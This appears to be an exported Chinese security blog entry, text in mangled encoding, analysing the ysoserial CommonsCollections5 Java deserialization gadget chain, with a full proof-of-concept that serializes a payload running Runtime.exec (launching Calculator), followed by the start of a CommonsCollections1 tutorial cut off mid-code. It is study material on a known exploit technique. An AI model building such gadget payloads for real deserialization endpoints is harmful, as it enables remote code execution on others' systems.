<p>æœ¬æ–‡CommonsCollections6åˆ©ç”¨é“¾çš„é™åˆ¶æ¡ä»¶ï¼š</p>
<p>â€‹	JDKç‰ˆæœ¬ï¼šæš‚æ— é™åˆ¶ã€ CommonsCollections 3.1 - 3.2.1</p>
<p>å®éªŒç¯å¢ƒ:</p>
<p>â€‹	JDK 1.8.0_261 ã€Commons-Collections 3.2.1 </p>
<h2 id="0x01-åˆ©ç”¨é“¾"><a href="#0x01-åˆ©ç”¨é“¾" class="headerlink" title="0x01 åˆ©ç”¨é“¾"></a>0x01 åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé‡ç‚¹çœ‹**BadAttributeValueExpException.readObject()<strong>å’Œ</strong>TiedMapEntry.toString()**ï¼Œå…¶ä»–çš„éƒ½å’Œå‰é¢ä¸¤ç« ä¸€æ · <a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484514&idx=1&sn=2552ec324c1395c9c3c8b9f78cbb4908&chksm=c2829d7bf5f5146d1d2dd0531344262a31b44f27d8c56c7465a9d0555c8773bc096424a0dd53&scene=0&xtrack=1#rd">Java ysoserialå­¦ä¹ ä¹‹CommonsCollections1(äºŒ)</a>ã€<a href="https://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484560&idx=1&sn=8a997456a5ccc09a4c11208e92c31093&chksm=c2829d89f5f5149f8000c1070e28eaf3049847b41e1377bf68f1074f7163ee7071eb61c84695&scene=0&xtrack=1#rd">Java ysoserialå­¦ä¹ ä¹‹CommonsCollections6(ä¸‰)</a></p>
<h3 id="1-1-TiedMapEntry-toString"><a href="#1-1-TiedMapEntry-toString" class="headerlink" title="1.1 TiedMapEntry.toString()"></a>1.1 TiedMapEntry.toString()</h3><p>ä¸Šä¸€èŠ‚è¯´è¿‡è§£å†³<strong>Javaé«˜ç‰ˆæœ¬åˆ©ç”¨</strong>é—®é¢˜ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨æ‰¾æ˜¯å¦è¿˜æœ‰å…¶ä»–è°ƒç”¨ <strong>LazyMap#get()</strong> çš„åœ°æ–¹ï¼Œå› ä¸º<strong>LazyMap</strong>å¯¹è±¡æ˜¯åªè¦æ‰§è¡Œ<strong>get</strong>æ–¹æ³•å°±ä¼šè°ƒç”¨<strong>transform</strong>ï¼Œè€Œ<strong>transform</strong>çš„ç‰¹æ€§æ˜¯å¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•ã€‚</p>
<p>CC6ä¸­æ˜¯åœ¨<strong>TiedMapEntry</strong>ç±»ä¸­æ‰¾åˆ°äº†<strong>hashCode</strong>æ–¹æ³•ä¸­è°ƒç”¨äº†<strong>map.get(key);</strong>,å¹¶ä¸”<strong>map</strong>æ˜¯æˆ‘ä»¬å¯æ§çš„<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701204945.png" alt="image-20210630213657788"></p>
<p>è€ŒCC5ä¸­åˆ™æ˜¯åˆ©ç”¨äº†<strong>TiedMapEntry#toString</strong>æ–¹æ³•<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701204954.png" alt="image-20210630212357694"></p>
<p>è¿˜æ˜¯å…ˆå®éªŒä¸€ä¸‹ï¼Œç¡®å®šå¯ä»¥<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205000.png" alt="image-20210630214320487"></p>
<p>ä½†è¿™è¿˜ä¸å¤Ÿå¥½ï¼Œæˆ‘ä»¬å¸Œæœ›çš„æ˜¯ç›®æ ‡ååºåˆ—åŒ–åç›´æ¥è§¦å‘å‘½ä»¤çš„æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»åœ¨ååºåˆ—åŒ–åä¼šç›´æ¥è§¦å‘ <strong>TiedMapEntry#toString</strong> ä»è€Œè§¦å‘å‘½ä»¤çš„æ‰§è¡Œã€‚</p>
<h3 id="1-2-BadAttributeValueExpException-readObject"><a href="#1-2-BadAttributeValueExpException-readObject" class="headerlink" title="1.2 BadAttributeValueExpException.readObject()"></a>1.2 BadAttributeValueExpException.readObject()</h3><p>åœ¨ysoserialä¸­æ˜¯åˆ©ç”¨äº† <strong>rt.jar!&#x2F;javax&#x2F;management&#x2F;BadAttributeValueExpException.class#readObject</strong>æ–¹æ³•æ¥è¾¾åˆ°ä¸Šè¿°ç›®çš„<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205412.png" alt="image-20210630214951419"></p>
<blockquote>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<strong>BadAttributeValueExpException</strong>å¹¶æ²¡æœ‰å®ç°<strong>Serializable</strong>æ¥å£,ä¸ºä»€ä¹ˆå¯ä»¥åºåˆ—åŒ–ï¼Ÿ<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205417.png" alt="image-20210701200642699"></p>
<p>å…¶å®æ˜¯<strong>BadAttributeValueExpException</strong>ç»§æ‰¿äº†<strong>Exception</strong>ï¼Œ<strong>Exception</strong>åˆç»§æ‰¿äº†<strong>Throwable</strong>ï¼Œ<strong>Throwable</strong>å®ç°äº†<strong>Serializable</strong>æ¥å£<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205421.png" alt="image-20210701200756489"></p>
</blockquote>
<p>åœ¨<strong>BadAttributeValueExpException#readObject</strong>ä¸­å‘ç°<strong>get</strong>å‡½æ•°è·å–<strong>val</strong>çš„å€¼ç„¶åèµ‹ç»™<strong>valObj</strong>ï¼Œç„¶ååœ¨ç¬¦åˆ<strong>ç¬¬äºŒä¸ªelse if</strong>çš„æƒ…å†µä¸‹å°±ä¼šè°ƒç”¨<strong>toString</strong>, å·§çš„æ˜¯ <strong>System.getSecurityManager()</strong> è¿”å›å€¼é»˜è®¤ä¸º<strong>null</strong><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205426.png" alt="image-20210701201112074"></p>
<p>è¿™æ ·å°±åªéœ€è¦å¯ä»¥æ§åˆ¶<strong>val</strong>çš„å€¼å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å‘ç°åœ¨æ„é€ å‡½æ•°ä¸­å°±å¯ä»¥æ§åˆ¶<strong>val</strong>çš„å€¼ï¼Œå¯ä»¥ç›´æ¥å°†<strong>tiedMapEntry</strong>ä½œä¸ºå‚æ•°ä¼ è¿›å»ã€‚</p>
<p><strong>æ³¨æ„</strong>:åœ¨æ„é€ å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå½“ä¼ å…¥ä¸€ä¸ª<strong>val</strong>ï¼Œ<strong>val</strong>å°±ä¸ç­‰äº<strong>null</strong>ï¼Œä¼šè°ƒç”¨ä¸€æ¬¡<strong>toString()<strong>æ–¹æ³•,ä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ›å»º</strong>BadAttributeValueExpException</strong>å¯¹è±¡æ—¶ä¼šå¼¹å‡ºä¸€æ¬¡è®¡ç®—å™¨ï¼Œè€Œåœ¨æˆ‘ä»¬çš„æ„æƒ³ä¸­ï¼Œååºåˆ—åŒ–æ—¶ä¹Ÿä¼šå¼¹å‡ºä¸€æ¬¡ï¼Œæ€»å…±æ˜¯<strong>ä¸¤</strong>æ¬¡ã€‚<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205431.png" alt="image-20210630220727451"></p>
<p>å®éªŒä¸€ä¸‹<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205435.png" alt="image-20210630221313347"></p>
<p>ä½†æ˜¯ï¼Œæœ€ç»ˆå‘ç°åªå¼¹äº†ä¸€æ¬¡è®¡ç®—å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ååºåˆ—åŒ–æ—¶å¹¶æ²¡æœ‰æ‰§è¡Œ<strong>toString</strong>æ–¹æ³•ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ç›´æ¥åœ¨<strong>BadAttributeValueExpException#readObject</strong>ä¸‹æ–­ç‚¹Debugä¸€ä¸‹,ä¼šå‘ç°è¿™æ—¶<strong>valObj</strong>æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²äº†ï¼Œç›´æ¥è¿›å…¥äº†<strong>ç¬¬ä¸€ä¸ª else if <strong>åˆ¤æ–­ä¸­ï¼Œå¹¶æ²¡æœ‰è¿›å…¥</strong>ç¬¬äºŒä¸ª else if <strong>ï¼Œè¿™æ˜¯å› ä¸ºåœ¨åˆ›å»º</strong>BadAttributeValueExpException</strong>å¯¹è±¡æ—¶ï¼Œ<strong>val</strong>å·²ç»æ‰§è¡Œè¿‡äº†ä¸€æ¬¡<strong>toString</strong>æ–¹æ³•ï¼Œå˜æˆäº†å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åŒ¹é…åˆ°äº†**ç¬¬ä¸€ä¸ª else if **åˆ¤æ–­<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205443.png" alt="image-20210630221828997"></p>
<p>è¦æƒ³æ”¹å˜<strong>val</strong>çš„å€¼å°±éœ€è¦ç”¨åˆ°å‰é¢åå¤æåˆ°çš„<strong>åå°„</strong>äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ©ç”¨åå°„ä¿®æ”¹ BadAttributeValueExpException ä¸­çš„ val ä¸º tiedMapEntry</span></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(bad, tiedMapEntry);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210701205451.png" alt="image-20210701204112054"></p>
<p>å®Œæ•´ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/30 21:05</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// éšè—é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨ LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ©ç”¨åå°„ä¿®æ”¹ BadAttributeValueExpException ä¸­çš„ val ä¸º tiedMapEntry</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(bad, tiedMapEntry);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(bad);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–è¯»å– out.bin æ–‡ä»¶</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="0x02-å‚è€ƒ"><a href="#0x02-å‚è€ƒ" class="headerlink" title="0x02 å‚è€ƒ"></a>0x02 å‚è€ƒ</h2><p>å¤©ä¸‹å¤§æœ¨å¤´å¸ˆå‚…çš„ <a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0</a></p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>æ¼æ´åŸç†</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ysoserialå­¦ä¹ ä¹‹CommonsCollections1(äºŒ)</title>
    <url>/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/</url>
    <content><![CDATA[<blockquote>
<p>  è¶…é•¿é¢„è­¦</p>
</blockquote>
<h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h2><p>Apache Commons Collectionsæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ã€‚</p>
<p>Apache Commons Collections ä¸­æä¾›äº†ä¸€ä¸ªTransformerçš„ç±»ï¼Œè¿™ä¸ªæ¥å£çš„åŠŸèƒ½å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¦å¤–ä¸€ä¸ªå¯¹è±¡ï¼ŒCCé“¾éƒ½ä¾èµ–äºæ­¤ã€‚</p>
<p>æœ¬æ–‡CommonsCollections1åˆ©ç”¨é“¾çš„é™åˆ¶æ¡ä»¶ï¼š</p>
<p>â€‹	JDKç‰ˆæœ¬ï¼šjdk1.8ä»¥å‰ï¼ˆ8u71ä¹‹åå·²ä¿®å¤ä¸å¯åˆ©ç”¨ï¼‰ã€Commons-Collections 3.1-3.2.1</p>
<p>å®éªŒç¯å¢ƒï¼š</p>
<p>â€‹	JDK 1.7.0_80ã€Commons-Collections 3.2.1 </p>
<h2 id="0x02-Pç‰›ç®€åŒ–çš„åˆ©ç”¨é“¾Demoåˆ†æ"><a href="#0x02-Pç‰›ç®€åŒ–çš„åˆ©ç”¨é“¾Demoåˆ†æ" class="headerlink" title="0x02 Pç‰›ç®€åŒ–çš„åˆ©ç”¨é“¾Demoåˆ†æ"></a>0x02 Pç‰›ç®€åŒ–çš„åˆ©ç”¨é“¾Demoåˆ†æ</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥é€è¡Œåˆ†æè¿™ä¸ªç®€å•çš„Demo</p>
<h3 id="2-1-Transformer-æ¥å£"><a href="#2-1-Transformer-æ¥å£" class="headerlink" title="2.1 Transformer æ¥å£"></a>2.1 Transformer æ¥å£</h3><p>Transformeræ˜¯ä¸€ä¸ªæ¥å£ï¼Œå®ƒåªæœ‰ä¸€ä¸ªå¾…å®ç°çš„<code>transform</code>æ–¹æ³•:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç–‘é—®1: Java ä¸­æ¥å£æ˜¯ä¸èƒ½å®ä¾‹åŒ–çš„ï¼Œä½†æ˜¯ä¸ºå•¥å¯ä»¥è¿™æ ·å†™<code>Transformer[] transformers = new Transformer[]</code> ï¼ŒPç‰›æœ‰åœ¨<strong>ä»£ç å®¡è®¡</strong>çŸ¥è¯†æ˜Ÿçƒä¸­å›ç­”ï¼šè¿™é‡Œæ˜¯<strong>å®ä¾‹åŒ–</strong>äº†ä¸€ä¸ª<strong>æ•°ç»„</strong>ï¼Œå¹¶ä¸æ˜¯å®ä¾‹åŒ–<code>Transformer</code>æ¥å£ï¼ˆå¤§å­¦å­¦çš„çŸ¥è¯†éƒ½å¿«å¿˜å®Œäº†ï¼‰ã€‚</p>
<p>æ‰€ä»¥ç¬¬ä¸€è¡Œæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„çš„ç±»å‹æ˜¯ <code>Transformer</code>, è¯¥æ•°ç»„ä¸­æœ‰ä¸¤ä¸ªå…ƒç´ ï¼š</p>
<ul>
<li><p><strong>new ConstantTransformer(Runtime.getRuntime())</strong></p>
</li>
<li><p><strong>new InvokerTransformer(â€œexecâ€, new Class[]{String.class}, new Object[] {â€œ&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculatorâ€})</strong></p>
</li>
</ul>
<h3 id="2-2-ConstantTransformer-ç±»"><a href="#2-2-ConstantTransformer-ç±»" class="headerlink" title="2.2 ConstantTransformer ç±»"></a>2.2 ConstantTransformer ç±»</h3><p>ConstantTransformer æ˜¯å®ç°äº†Transformeræ¥å£çš„ä¸€ä¸ªç±»ï¼Œå¹¶ä¸”ä¹Ÿå®ç°äº†<code>Serializable</code>æ¥å£ï¼Œè¯´æ˜æ˜¯å¯åºåˆ—åŒ–çš„<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202433.png" alt="image-20210608115434960"></p>
<p>å®ƒçš„è¿‡ç¨‹å°±æ˜¯åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶åœ¨<code>transform</code>æ–¹æ³•å°†è¿™ä¸ªå¯¹è±¡å†è¿”å›ã€‚</p>
<h3 id="2-3-InvokerTransformer-ç±»"><a href="#2-3-InvokerTransformer-ç±»" class="headerlink" title="2.3 InvokerTransformer ç±»"></a>2.3 InvokerTransformer ç±»</h3><p>InvokerTransformer ä¹Ÿæ˜¯å®ç°äº†Transformeræ¥å£çš„ä¸€ä¸ªç±»ï¼Œæœ‰ä¸¤ä¸ªæ„é€ æ–¹æ³•ï¼Œä¹Ÿæ˜¯å®ç°äº†<code>Serializable</code>æ¥å£<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210609202441.png" alt="image-20210608204045987"></p>
<p>è¿™é‡ŒPç‰›ä½¿ç”¨çš„æ˜¯ç¬¬äºŒä¸ªæ„é€ æ–¹æ³•ï¼Œä¼ å…¥äº†æ–¹æ³•åä¸ºæ‰§è¡Œå‘½ä»¤çš„<code>exec</code>æ–¹æ³•ï¼Œå‚æ•°ç±»å‹ä¸ºæ•°ç»„<code>new Class[]&#123;String.class&#125;</code>ï¼Œæ‰§è¡Œçš„æ˜¯æ‰“å¼€è®¡ç®—å™¨ <code>new Object[] &#123;&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&#125;</code></p>
<p>è¿™é‡Œä¹Ÿå®ç°äº†<code>transform</code>æ–¹æ³•ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> 